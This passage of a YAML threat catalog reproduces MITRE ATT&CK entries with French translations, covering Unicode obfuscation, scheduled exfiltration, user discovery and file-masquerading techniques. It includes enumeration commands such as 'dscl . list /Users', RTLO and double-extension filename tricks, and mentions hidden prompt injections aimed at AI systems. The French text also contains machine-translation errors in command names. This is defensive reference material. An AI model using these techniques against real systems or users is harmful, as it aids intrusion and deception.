          \ - Veracode) \n\nUnicode est un mod\xE8le standardis\xE9 d\u2019encodage\
          \ de caract\xE8res qui attribue une valeur num\xE9rique unique, appel\xE9\
          e point de code, \xE0 chaque caract\xE8re \xE0 travers les syst\xE8mes d\u2019\
          \xE9criture, permettant une repr\xE9sentation coh\xE9rente du texte entre\
          \ plateformes, applications et langues. Les points de code sont repr\xE9\
          sent\xE9s par 'U+' suivi d\u2019une valeur hexad\xE9cimale et peuvent \xEA\
          tre encod\xE9s en utilisant des formats tels que 'UTF-8' ou 'UTF-16'. Les\
          \ adversaires peuvent abuser des points de code valides dans Unicode qui\
          \ ne sont pas visiblement rendus mais qui occupent tout de m\xEAme des octets,\
          \ tels que des espaces \xE0 largeur z\xE9ro, des s\xE9lecteurs de variations\
          \ ou des contr\xF4les de formatage bidirectionnels, afin de dissimuler des\
          \ charges utiles malveillantes. (Citation : Tycoon2FA - Unicode)(Citation\
          \ : GlassWorm - Unicode)(Citation : Unicode et invites cach\xE9es - Perets)\n\
          \nLes adversaires peuvent \xE9galement exploiter des caract\xE8res de zone\
          \ d\u2019utilisation priv\xE9e (PUA), une gamme de points de code r\xE9\
          serv\xE9s \xE0 l\u2019attribution personnalis\xE9e. Les caract\xE8res PUA\
          \ qui ne sont pas d\xE9finis par une police ou une application sont g\xE9\
          n\xE9ralement rendus vides. (Citation : PUAs Unicode - Eriksen)\n\nLes caract\xE8\
          res Unicode peuvent \xE9galement \xEAtre utilis\xE9s pour soutenir d\u2019\
          autres techniques telles que [Phishing](https://attack.mitre.org/techniques/T1660),\
          \ [Droite-to-Gauche](https://attack.mitre.org/techniques/T1036/002) ou [Ex\xE9\
          cution utilisateur](https://attack.mitre.org/techniques/T1204). Par exemple,\
          \ certains adversaires peuvent int\xE9grer des injections de prompts par\
          \ intelligence artificielle (IA) \xE0 l\u2019aide de caract\xE8res Unicode\
          \ invisibles dans des e-mails ou des documents qui paraissent b\xE9nins\
          \ lorsqu\u2019ils sont trait\xE9s par des syst\xE8mes d\u2019IA. (Citation\
          \ : LLM et Unicode - Medium)(Citation : Injection invisible de prompts -\
          \ Trend Micro)\nhttps://attack.mitre.org/techniques/T1027/018"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1029
    ref_id: T1029
    name: Scheduled Transfer
    description: 'Adversaries may schedule data exfiltration to be performed only
      at certain times of day or at certain intervals. This could be done to blend
      traffic patterns with normal activity or availability.


      When scheduled exfiltration is used, other exfiltration techniques likely apply
      as well to transfer the information out of the network, such as [Exfiltration
      Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration
      Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).

      https://attack.mitre.org/techniques/T1029'
    translations:
      fr:
        name: "Transfert programm\xE9"
        description: "Les adversaires peuvent programmer l\u2019extraction de donn\xE9\
          es uniquement \xE0 certains moments de la journ\xE9e ou \xE0 certains intervalles.\
          \ Cela pourrait \xEAtre fait pour m\xE9langer les sch\xE9mas de trafic avec\
          \ l\u2019activit\xE9 ou la disponibilit\xE9 normale.\n\nLorsque l\u2019\
          exfiltration programm\xE9e est utilis\xE9e, d\u2019autres techniques d\u2019\
          exfiltration s\u2019appliquent probablement \xE9galement pour transf\xE9\
          rer l\u2019information hors du r\xE9seau, telles que [Exfiltration sur canal\
          \ C2](https://attack.mitre.org/techniques/T1041) ou [Exfiltration sur protocole\
          \ alternatif](https://attack.mitre.org/techniques/T1048).\nhttps://attack.mitre.org/techniques/T1029"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1030
    ref_id: T1030
    name: Data Transfer Size Limits
    description: 'An adversary may exfiltrate data in fixed size chunks instead of
      whole files or limit packet sizes below certain thresholds. This approach may
      be used to avoid triggering network data transfer threshold alerts.

      https://attack.mitre.org/techniques/T1030'
    translations:
      fr:
        name: "Limites de taille de transfert de donn\xE9es"
        description: "Un adversaire peut exfiltrer les donn\xE9es en blocs de taille\
          \ fixe au lieu de fichiers entiers ou limiter la taille des paquets en dessous\
          \ de certains seuils. Cette approche peut \xEAtre utilis\xE9e pour \xE9\
          viter de d\xE9clencher des alertes de seuil de transfert de donn\xE9es r\xE9\
          seau.\nhttps://attack.mitre.org/techniques/T1030"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1033
    ref_id: T1033
    name: System Owner/User Discovery
    description: 'Adversaries may attempt to identify the primary user, currently
      logged in user, set of users that commonly uses a system, or whether a user
      is actively using the system. They may do this, for example, by retrieving account
      usernames or by using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003).
      The information may be collected in a number of different ways using other Discovery
      techniques, because user and username details are prevalent throughout a system
      and include running process ownership, file/directory ownership, session information,
      and system logs. Adversaries may use the information from [System Owner/User
      Discovery](https://attack.mitre.org/techniques/T1033) during automated discovery
      to shape follow-on behaviors, including whether or not the adversary fully infects
      the target and/or attempts specific actions.


      Various utilities and commands may acquire this information, including <code>whoami</code>.
      In macOS and Linux, the currently logged in user can be identified with <code>w</code>
      and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v ''_''</code>
      command can also be used to enumerate user accounts. Environment variables,
      such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to
      access this information.


      On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `show users` and `show ssh` can be used to display users currently
      logged into the device.(Citation: show_ssh_users_cmd_cisco)(Citation: US-CERT
      TA18-106A Network Infrastructure Devices 2018)'
    translations:
      fr:
        name: "D\xE9couverte du propri\xE9taire du syst\xE8me/utilisateur"
        description: "Les adversaires peuvent tenter d\u2019identifier l\u2019utilisateur\
          \ principal, l\u2019utilisateur actuellement connect\xE9, l\u2019ensemble\
          \ d\u2019utilisateurs qui utilisent couramment un syst\xE8me, ou si un utilisateur\
          \ utilise activement le syst\xE8me. Ils peuvent le faire, par exemple, en\
          \ r\xE9cup\xE9rant les noms d\u2019utilisateur des comptes ou en utilisant\
          \ [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Les\
          \ informations peuvent \xEAtre collect\xE9es de diff\xE9rentes mani\xE8\
          res en utilisant d\u2019autres techniques de d\xE9couverte, car les d\xE9\
          tails utilisateur et nom d\u2019utilisateur sont pr\xE9dominants dans tout\
          \ un syst\xE8me et incluent la propri\xE9t\xE9 des processus en cours, la\
          \ propri\xE9t\xE9 des fichiers/r\xE9pertoires, les informations de session\
          \ et les journaux syst\xE8me. Les adversaires peuvent utiliser les informations\
          \ de [Propri\xE9taire du syst\xE8me/D\xE9couverte utilisateur](https://attack.mitre.org/techniques/T1033)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques.\n\nDivers utilitaires et commandes\
          \ peuvent acqu\xE9rir cette information, y compris <code>whoami</code>.\
          \ Dans macOS et Linux, l\u2019utilisateur actuellement connect\xE9 peut\
          \ \xEAtre identifi\xE9 avec <code>w</code> et <code>qui</code>. Sur macOS,\
          \ la commande <code>dscl . list /Users | grep -v '_'</code> peut \xE9galement\
          \ \xEAtre utilis\xE9e pour \xE9num\xE9rer les comptes utilisateurs. Des\
          \ variables d\u2019environnement, telles <code>que %USERNAME\_%</code> et\
          \ <code>$USER</code>, peuvent \xE9galement \xEAtre utilis\xE9es pour acc\xE9\
          der \xE0 ces informations.\n\nSur les appareils r\xE9seau, des commandes\
          \ [CLI de p\xE9riph\xE9rique r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB montrer les utilisateurs \xBB et \xAB afficher ssh \xBB\
          \ peuvent \xEAtre utilis\xE9es pour afficher les utilisateurs actuellement\
          \ connect\xE9s \xE0 l\u2019appareil. (Citation : show_ssh_users_cmd_cisco)(Citation\
          \ : US-CERT TA18-106A Dispositifs d\u2019infrastructure r\xE9seau 2018)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036
    ref_id: T1036
    name: Masquerading
    description: 'Adversaries may attempt to manipulate features of their artifacts
      to make them appear legitimate or benign to users and/or security tools. Masquerading
      occurs when the name or location of an object, legitimate or malicious, is manipulated
      or abused for the sake of evading defenses and observation. This may include
      manipulating file metadata, tricking users into misidentifying the file type,
      and giving legitimate task or service names.


      Renaming abusable system utilities to evade security monitoring is also a form
      of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS
      Main Site)'
    translations:
      fr:
        name: Masquerading
        description: "Les adversaires peuvent tenter de manipuler les caract\xE9ristiques\
          \ de leurs artefacts pour les faire para\xEEtre l\xE9gitimes ou b\xE9nins\
          \ aux yeux des utilisateurs et/ou des outils de s\xE9curit\xE9. Le masquage\
          \ se produit lorsque le nom ou l\u2019emplacement d\u2019un objet, l\xE9\
          gitime ou malveillant, est manipul\xE9 ou abus\xE9 dans le but d\u2019\xE9\
          chapper aux d\xE9fenses et \xE0 l\u2019observation. Cela peut inclure la\
          \ manipulation des m\xE9tadonn\xE9es de fichiers, la tromperie des utilisateurs\
          \ pour qu\u2019ils identifient mal le type de fichier, et la fourniture\
          \ de noms l\xE9gitimes de t\xE2ches ou de services.\n\nRenommer des utilitaires\
          \ syst\xE8me abusables pour \xE9chapper \xE0 la surveillance de s\xE9curit\xE9\
          \ est \xE9galement une forme de [Masquerading](https://attack.mitre.org/techniques/T1036).\
          \ (Citation : Site principal de LOLBAS)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.001
    ref_id: T1036.001
    name: Invalid Code Signature
    description: 'Adversaries may attempt to mimic features of valid code signatures
      to increase the chance of deceiving a user, analyst, or tool. Code signing provides
      a level of authenticity on a binary from the developer and a guarantee that
      the binary has not been tampered with. Adversaries can copy the metadata and
      signature information from a signed program, then use it as a template for an
      unsigned program. Files with invalid code signatures will fail digital signature
      validation checks, but they may appear more legitimate to users and security
      tools may improperly handle these files.(Citation: Threatexpress MetaTwin 2017)


      Unlike [Code Signing](https://attack.mitre.org/techniques/T1553/002), this activity
      will not result in a valid signature.

      https://attack.mitre.org/techniques/T1036/001'
    translations:
      fr:
        name: Signature de code invalide
        description: "Les adversaires peuvent tenter d\u2019imiter des caract\xE9\
          ristiques de signatures de code valides afin d\u2019augmenter le risque\
          \ de tromper un utilisateur, un analyste ou un outil. La signature de code\
          \ offre un niveau d\u2019authenticit\xE9 sur un binaire provenant du d\xE9\
          veloppeur et une garantie que le binaire n\u2019a pas \xE9t\xE9 alt\xE9\
          r\xE9. Les adversaires peuvent copier les m\xE9tadonn\xE9es et les informations\
          \ de signature d\u2019un programme sign\xE9, puis les utiliser comme mod\xE8\
          le pour un programme non sign\xE9. Les fichiers avec des signatures de code\
          \ invalides \xE9choueront aux v\xE9rifications de validation des signatures\
          \ num\xE9riques, mais ils peuvent sembler plus l\xE9gitimes aux yeux des\
          \ utilisateurs et les outils de s\xE9curit\xE9 peuvent mal g\xE9rer ces\
          \ fichiers. (Citation : Threatexpress MetaTwin 2017)\n\nContrairement \xE0\
          \ [Code Signing](https://attack.mitre.org/techniques/T1553/002), cette activit\xE9\
          \ ne donnera pas lieu \xE0 une signature valide.\nhttps://attack.mitre.org/techniques/T1036/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.002
    ref_id: T1036.002
    name: Right-to-Left Override
    description: 'Adversaries may abuse the right-to-left override (RTLO or RLO) character
      (U+202E) to disguise a string and/or file name to make it appear benign. RTLO
      is a non-printing Unicode character that causes the text that follows it to
      be displayed in reverse. For example, a Windows screensaver executable named
      <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>.
      A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed
      as <code>photo_high_resj.png</code>.(Citation: Infosecinstitute RTLO Technique)


      Adversaries may abuse the RTLO character as a means of tricking a user into
      executing what they think is a benign file type. A common use of this technique
      is with [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious
      File](https://attack.mitre.org/techniques/T1204/002) since it can trick both
      end users and defenders if they are not aware of how their tools display and
      render the RTLO character. Use of the RTLO character has been seen in many targeted
      intrusion attempts and criminal activity.(Citation: Trend Micro PLEAD RTLO)(Citation:
      Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows Registry as well,
      where regedit.exe displays the reversed characters but the command line tool
      reg.exe does not by default.

      https://attack.mitre.org/techniques/T1036/002'
    translations:
      fr:
        name: "Outremise de droite \xE0 gauche"
        description: "Les adversaires peuvent abuser du caract\xE8re de droite \xE0\
          \ gauche (RTLO ou RLO) (U+202E) pour d\xE9guiser une cha\xEEne et/ou un\
          \ nom de fichier afin de le faire para\xEEtre anodin. RTLO est un caract\xE8\
          re Unicode non imprimant qui fait que le texte qui le suit est affich\xE9\
          \ \xE0 l\u2019envers. Par exemple, un ex\xE9cutable d\u2019\xE9conomiseur\
          \ d\u2019\xE9cran Windows nomm\xE9 <code>25 mars et Excod.scr</code> s\u2019\
          affichera <code>comme 25 mars rcs.docx</code>. Un fichier JavaScript nomm\xE9\
          \ <code>photo_high_re\\u202Egnp.js</code> sera affich\xE9 sous <code>forme\
          \ de photo_high_resj.png</code>. (Citation : Technique RTLO de l\u2019Infosecinstitute)\n\
          \nLes adversaires peuvent abuser du caract\xE8re RTLO pour tromper un utilisateur\
          \ afin qu\u2019il ex\xE9cute ce qu\u2019il pense \xEAtre un type de fichier\
          \ b\xE9nin. Une utilisation courante de cette technique est avec [Spearphishing\
          \ Attachment](https://attack.mitre.org/techniques/T1566/001)/[Malicious\
          \ File](https://attack.mitre.org/techniques/T1204/002), car elle peut tromper\
          \ \xE0 la fois les utilisateurs finaux et les d\xE9fenseurs s\u2019ils ne\
          \ sont pas conscients de la fa\xE7on dont leurs outils affichent et affichent\
          \ le caract\xE8re RTLO. L\u2019utilisation du caract\xE8re RTLO a \xE9t\xE9\
          \ observ\xE9e lors de nombreuses tentatives d\u2019intrusion cibl\xE9es\
          \ et activit\xE9s criminelles. (Citation : Trend Micro PLEAD RTLO)(Citation\
          \ : Kaspersky RTLO Cybercriminalit\xE9) RTLO peut \xE9galement \xEAtre utilis\xE9\
          \ dans le registre Windows, o\xF9 regedit.exe affiche les caract\xE8res\
          \ invers\xE9s mais l\u2019outil de ligne de commande reg.exe ne le fait\
          \ pas par d\xE9faut.\nhttps://attack.mitre.org/techniques/T1036/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.003
    ref_id: T1036.003
    name: Rename Legitimate Utilities
    description: 'Adversaries may rename legitimate / system utilities to try to evade
      security mechanisms concerning the usage of those utilities. Security monitoring
      and control mechanisms may be in place for legitimate utilities adversaries
      are capable of abusing, including both built-in binaries and tools such as PSExec,
      AutoHotKey, and IronPython.(Citation: LOLBAS Main Site)(Citation: Huntress Python
      Malware 2025)(Citation: The DFIR Report AutoHotKey 2023)(Citation: Splunk Detect
      Renamed PSExec) It may be possible to bypass those security mechanisms by renaming
      the utility prior to utilization (ex: rename <code>rundll32.exe</code>).(Citation:
      Elastic Masquerade Ball) An alternative case occurs when a legitimate utility
      is copied or moved to a different directory and renamed to avoid detections
      based on these utilities executing from non-standard paths.(Citation: F-Secure
      CozyDuke)

      https://attack.mitre.org/techniques/T1036/003'
    translations:
      fr:
        name: "Renommer les services publics l\xE9gitimes"
        description: "Les adversaires peuvent renommer des utilitaires l\xE9gitimes\
          \ ou syst\xE8me afin d\u2019essayer d\u2019\xE9chapper aux m\xE9canismes\
          \ de s\xE9curit\xE9 li\xE9s \xE0 l\u2019utilisation de ces utilitaires.\
          \ Des m\xE9canismes de surveillance et de contr\xF4le de s\xE9curit\xE9\
          \ peuvent \xEAtre mis en place pour des utilit\xE9s l\xE9gitimes que les\
          \ adversaires peuvent exploiter, y compris \xE0 la fois des binaires int\xE9\
          gr\xE9s et des outils tels que PSExec, AutoHotKey et IronPython. (Citation\
          \ : Site principal de LOLBAS)(Citation : Huntress Python Malware 2025)(Citation\
          \ : Le rapport DFIR AutoHotKey 2023)(Citation : D\xE9tection de Splunk renomm\xE9\
          \ PSExec) Il peut \xEAtre possible de contourner ces m\xE9canismes de s\xE9\
          curit\xE9 en renommant l\u2019utilitaire avant son utilisation (ex : <code>renommer\
          \ rundll32.exe</code>). (Citation : Bal masqu\xE9 \xE9lastique) Un cas alternatif\
          \ survient lorsqu\u2019un utilitaire l\xE9gitime est copi\xE9 ou d\xE9plac\xE9\
          \ dans un autre r\xE9pertoire et renomm\xE9 pour \xE9viter les d\xE9tections\
          \ bas\xE9es sur l\u2019ex\xE9cution de ces utilitaires \xE0 partir de chemins\
          \ non standards. (Citation : F-Secure CozyDuke)\nhttps://attack.mitre.org/techniques/T1036/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.004
    ref_id: T1036.004
    name: Masquerade Task or Service
    description: 'Adversaries may attempt to manipulate the name of a task or service
      to make it appear legitimate or benign. Tasks/services executed by the Task
      Scheduler or systemd will typically be given a name and/or description.(Citation:
      TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have
      a service name as well as a display name. Many benign tasks and services exist
      that have commonly associated names. Adversaries may give tasks or services
      names that are similar or identical to those of legitimate ones.


      Tasks or services contain other fields, such as a description, that adversaries
      may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation:
      Fysbis Dr Web Analysis)

      https://attack.mitre.org/techniques/T1036/004'
    translations:
      fr:
        name: "T\xE2che ou service masqu\xE9"
        description: "Les adversaires peuvent tenter de manipuler le nom d\u2019une\
          \ t\xE2che ou d\u2019un service pour le faire para\xEEtre l\xE9gitime ou\
          \ b\xE9nin. Les t\xE2ches/services ex\xE9cut\xE9s par le planificateur de\
          \ t\xE2ches ou le systemd re\xE7oivent g\xE9n\xE9ralement un nom et/ou une\
          \ description. (Citation : TechNet Schtasks)(Citation : Unit\xE9s de service\
          \ du Systemd) Les services Windows auront un nom de service ainsi qu\u2019\
          un nom d\u2019affichage. De nombreuses t\xE2ches et services b\xE9nignes\
          \ existent qui portent des noms commun\xE9ment associ\xE9s. Les adversaires\
          \ peuvent attribuer des noms de t\xE2ches ou de services similaires ou identiques\
          \ \xE0 ceux des noms l\xE9gitimes.\n\nLes t\xE2ches ou services contiennent\
          \ d\u2019autres champs, tels qu\u2019une description, que les adversaires\
          \ peuvent tenter de rendre l\xE9gitimes. (Citation : Palo Alto Shamoon,\
          \ novembre 2016)(Citation : Analyse Web de Fysbis Dr)\nhttps://attack.mitre.org/techniques/T1036/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.005
    ref_id: T1036.005
    name: Match Legitimate Resource Name or Location
    description: "Adversaries may match or approximate the name or location of legitimate\
      \ files, Registry keys, or other resources when naming/placing them. This is\
      \ done for the sake of evading defenses and observation. \n\nThis may be done\
      \ by placing an executable in a commonly trusted directory (ex: under System32)\
      \ or giving it the name of a legitimate, trusted program (ex: `svchost.exe`).\
      \ Alternatively, a Windows Registry key may be given a close approximation to\
      \ a key used by a legitimate program. In containerized environments, a threat\
      \ actor may create a resource in a trusted namespace or one that matches the\
      \ naming convention of a container pod or cluster.(Citation: Aquasec Kubernetes\
      \ Backdoor 2023)\nhttps://attack.mitre.org/techniques/T1036/005"
    translations:
      fr:
        name: "Correspondre au nom ou \xE0 la localisation l\xE9gitime de la ressource"
        description: "Les adversaires peuvent faire correspondre ou approcher le nom\
          \ ou l\u2019emplacement de fichiers l\xE9gitimes, de cl\xE9s du Registre\
          \ ou d\u2019autres ressources lors de leur nom/placement. Cela est fait\
          \ pour \xE9chapper aux d\xE9fenses et \xE0 l\u2019observation. \n\nCela\
          \ peut se faire en pla\xE7ant un ex\xE9cutable dans un r\xE9pertoire commun\xE9\
          ment fiable (ex. : sous System32) ou en lui donnant le nom d\u2019un programme\
          \ l\xE9gitime et de confiance (ex : \xAB svchost.exe \xBB). Alternativement,\
          \ une cl\xE9 du Registre Windows peut recevoir une approximation proche\
          \ d\u2019une cl\xE9 utilis\xE9e par un programme l\xE9gitime. Dans les environnements\
          \ conteneuris\xE9s, un acteur de menace peut cr\xE9er une ressource dans\
          \ un espace de noms de confiance ou une ressource correspondant \xE0 la\
          \ convention de nommage d\u2019un pod ou d\u2019un cluster conteneur. (Citation\
          \ : Aquasec Kubernetes Backdoor 2023)\nhttps://attack.mitre.org/techniques/T1036/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.006
    ref_id: T1036.006
    name: Space after Filename
    description: 'Adversaries can hide a program''s true filetype by changing the
      extension of a file. With certain file types (specifically this does not work
      with .app extensions), appending a space to the end of a filename will change
      how the file is processed by the operating system.


      For example, if there is a Mach-O executable file called <code>evil.bin</code>,
      when it is double clicked by a user, it will launch Terminal.app and execute.
      If this file is renamed to <code>evil.txt</code>, then when double clicked by
      a user, it will launch with the default text editing application (not executing
      the binary). However, if the file is renamed to <code>evil.txt </code> (note
      the space at the end), then when double clicked by a user, the true file type
      is determined by the OS and handled appropriately and the binary will be executed
      (Citation: Mac Backdoors are back).


      Adversaries can use this feature to trick users into double clicking benign-looking
      files of any format and ultimately executing something malicious.

      https://attack.mitre.org/techniques/T1036/006'
    translations:
      fr:
        name: "Espace apr\xE8s le nom de fichier"
        description: "Les adversaires peuvent masquer le v\xE9ritable type de fichier\
          \ d\u2019un programme en modifiant l\u2019extension d\u2019un fichier. Pour\
          \ certains types de fichiers (notamment cela ne fonctionne pas avec les\
          \ extensions .app), ajouter un espace \xE0 la fin d\u2019un nom de fichier\
          \ modifie la mani\xE8re dont le fichier est trait\xE9 par le syst\xE8me\
          \ d\u2019exploitation.\n\nPar exemple, s\u2019il existe un fichier ex\xE9\
          cutable Mach-O appel\xE9 <code>evil.bin</code>, lorsqu\u2019un utilisateur\
          \ le double cliquera, il lance Terminal.app et s\u2019ex\xE9cute. Si ce\
          \ fichier est renomm\xE9 <code>en evil.txt</code>, alors lorsqu\u2019un\
          \ utilisateur fait un double clic, il se lance avec l\u2019application d\u2019\
          \xE9dition de texte par d\xE9faut (sans ex\xE9cuter le binaire). Cependant,\
          \ si le fichier est renomm\xE9 <code>en evil.txt </code> (notez l\u2019\
          espace \xE0 la fin), alors lorsqu\u2019un utilisateur double clique, le\
          \ v\xE9ritable type de fichier est d\xE9termin\xE9 par le syst\xE8me d\u2019\
          exploitation et trait\xE9 de mani\xE8re appropri\xE9e, et le binaire sera\
          \ ex\xE9cut\xE9 (Citation : Les portes d\xE9rob\xE9es Mac sont de retour).\n\
          \nLes adversaires peuvent utiliser cette fonctionnalit\xE9 pour tromper\
          \ les utilisateurs en les poussant \xE0 double-cliquer sur des fichiers\
          \ \xE0 l\u2019apparence inoffensive, quel que soit le format, et finalement\
          \ ex\xE9cuter quelque chose de malveillant.\nhttps://attack.mitre.org/techniques/T1036/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.007
    ref_id: T1036.007
    name: Double File Extension
    description: "Adversaries may abuse a double extension in the filename as a means\
      \ of masquerading the true file type. A file name may include a secondary file\
      \ type extension that may cause only the first extension to be displayed (ex:\
      \ <code>File.txt.exe</code> may render in some views as just <code>File.txt</code>).\
      \ However, the second extension is the true file type that determines how the\
      \ file is opened and executed. The real file extension may be hidden by the\
      \ operating system in the file browser (ex: explorer.exe), as well as in any\
      \ software configured using or similar to the system\u2019s policies.(Citation:\
      \ PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) \n\nAdversaries\
      \ may abuse double extensions to attempt to conceal dangerous file types of\
      \ payloads. A very common usage involves tricking a user into opening what they\
      \ think is a benign file type but is actually executable code. Such files often\
      \ pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)\
      \ into a user\u2019s system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)\
      \ then [User Execution](https://attack.mitre.org/techniques/T1204). For example,\
      \ an executable file attachment named <code>Evil.txt.exe</code> may display\
      \ as <code>Evil.txt</code> to a user. The user may then view it as a benign\
      \ text file and open it, inadvertently executing the hidden malware.(Citation:\
      \ SOCPrime DoubleExtension)\n\nCommon file types, such as text files (.txt,\
      \ .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first\
      \ extension to appear benign. Executable extensions commonly regarded as dangerous,\
      \ such as .exe, .lnk, .hta, and .scr, often appear as the second extension and\
      \ true file type.\nhttps://attack.mitre.org/techniques/T1036/007"
    translations:
      fr:
        name: Double extension de fichier
        description: "Les adversaires peuvent abuser d\u2019une double extension dans\
          \ le nom de fichier pour masquer le v\xE9ritable type de fichier. Un nom\
          \ de fichier peut inclure une extension secondaire de type de fichier qui\
          \ peut faire appara\xEEtre uniquement la premi\xE8re extension (par exemple\
          \ : <code>File.txt.exe</code> peut s\u2019afficher dans certaines vues comme\
          \ <code>File.txt</code>). Cependant, la seconde extension est le vrai type\
          \ de fichier qui d\xE9termine comment le fichier est ouvert et ex\xE9cut\xE9\
          . L\u2019extension de fichier r\xE9elle peut \xEAtre cach\xE9e par le syst\xE8\
          me d\u2019exploitation dans le navigateur de fichiers (ex\_: explorer.exe),\
          \ ainsi que dans tout logiciel configur\xE9 selon ou similaire aux politiques\
          \ du syst\xE8me. (Citation : PCMag DoubleExtension)(Citation : SOCPrime\
          \ DoubleExtension) \n\nLes adversaires peuvent abuser des doubles extensions\
          \ pour tenter de dissimuler des types de fichiers dangereux de charges utiles.\
          \ Un usage tr\xE8s courant consiste \xE0 tromper un utilisateur pour qu\u2019\
          il ouvre ce qu\u2019il pense \xEAtre un type de fichier anodin mais qui\
          \ est en r\xE9alit\xE9 du code ex\xE9cutable. Ces fichiers se pr\xE9sentent\
          \ souvent comme des pi\xE8ces jointes d\u2019e-mail et permettent \xE0 un\
          \ adversaire d\u2019obtenir un [Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001)\
          \ au syst\xE8me d\u2019un utilisateur via [Joint Spearphishing](https://attack.mitre.org/techniques/T1566/001)\
          \ puis [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204).\
          \ Par exemple, une pi\xE8ce jointe ex\xE9cutable <code>nomm\xE9e Evil.txt.exe</code>\
          \ peut s\u2019afficher comme <code>Evil.txt</code> \xE0 un utilisateur.\
          \ L\u2019utilisateur peut alors le voir comme un fichier texte b\xE9nin\
          \ et l\u2019ouvrir, ex\xE9cutant involontairement le malware cach\xE9. (Citation\
          \ : SOCPrime DoubleExtension)\n\nLes types de fichiers courants, tels que\
          \ les fichiers texte (.txt, .doc, etc.) et les fichiers image (.jpg, .gif,\
          \ etc.), sont g\xE9n\xE9ralement utilis\xE9s comme premi\xE8re extension\
          \ \xE0 para\xEEtre inoffensive. Les extensions ex\xE9cutables g\xE9n\xE9\
          ralement consid\xE9r\xE9es comme dangereuses, telles que .exe, .lnk, .hta\
          \ et .scr, apparaissent souvent comme la deuxi\xE8me extension et le type\
          \ de fichier v\xE9ritable.\nhttps://attack.mitre.org/techniques/T1036/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1036.008
    ref_id: T1036.008
    name: Masquerade File Type
    description: "Adversaries may masquerade malicious payloads as legitimate files\
      \ through changes to the payload's formatting, including the file\u2019s signature,\
      \ extension, icon, and contents. Various file types have a typical standard\
      \ format, including how they are encoded and organized. For example, a file\u2019\
      s signature (also known as header or magic bytes) is the beginning bytes of\
      \ a file and is often used to identify the file\u2019s type. For example, the\
      \ header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension\
      \ is either `.JPE`, `.JPEG` or `.JPG`. \n\nAdversaries may edit the header\u2019\
      s hex code and/or the file extension of a malicious payload in order to bypass\
      \ file validation checks and/or input sanitization. This behavior is commonly\
      \ used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
      \ and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001))\
      \ so that adversaries may move their malware without triggering detections.\
      \ \n\nCommon non-executable file types and extensions, such as text files (`.txt`)\
      \ and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.\
      \  Based on this, adversaries may use a file extension to disguise malware,\
      \ such as naming a PHP backdoor code with a file name of <code>test.gif</code>.\
      \ A user may not know that a file is malicious due to the benign appearance\
      \ and file extension.\n\nPolyglot files, which are files that have multiple\
      \ different file types and that function differently based on the application\
      \ that will execute them, may also be used to disguise malicious malware and\
      \ capabilities.(Citation: polygot_icedID)\nhttps://attack.mitre.org/techniques/T1036/008"
    translations:
      fr:
        name: "Type de fichier masqu\xE9"
        description: "Les adversaires peuvent faire passer des charges utiles malveillantes\
          \ pour des fichiers l\xE9gitimes en modifiant la mise en forme de la charge\
          \ utile, y compris la signature, l\u2019extension, l\u2019ic\xF4ne et le\
          \ contenu du fichier. Diff\xE9rents types de fichiers ont un format standard\
          \ typique, y compris la mani\xE8re dont ils sont encod\xE9s et organis\xE9\
          s. Par exemple, la signature d\u2019un fichier (\xE9galement appel\xE9e\
          \ en-t\xEAte ou octets magiques) est l\u2019octet de d\xE9but d\u2019un\
          \ fichier et est souvent utilis\xE9e pour identifier le type du fichier.\
          \ Par exemple, l\u2019en-t\xEAte d\u2019un fichier JPEG est <code> 0xFF\
          \ 0xD8</code> et l\u2019extension du fichier est soit '. JPE', '. JPEG'\
          \ ou '.JPG'. \n\nLes adversaires peuvent modifier le code hexad\xE9cimal\
          \ de l\u2019en-t\xEAte et/ou l\u2019extension de fichier d\u2019une charge\
          \ utile malveillante afin de contourner les v\xE9rifications de validation\
          \ des fichiers et/ou la salubrisation des entr\xE9es. Ce comportement est\
          \ couramment utilis\xE9 lorsque des fichiers payload sont transf\xE9r\xE9\
          s (par exemple, [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))\
          \ et stock\xE9s (par exemple, [Upload Malware](https://attack.mitre.org/techniques/T1608/001))\
          \ afin que les adversaires puissent d\xE9placer leur malware sans d\xE9\
          clencher de d\xE9tection. \n\nLes types de fichiers non ex\xE9cutables courants\
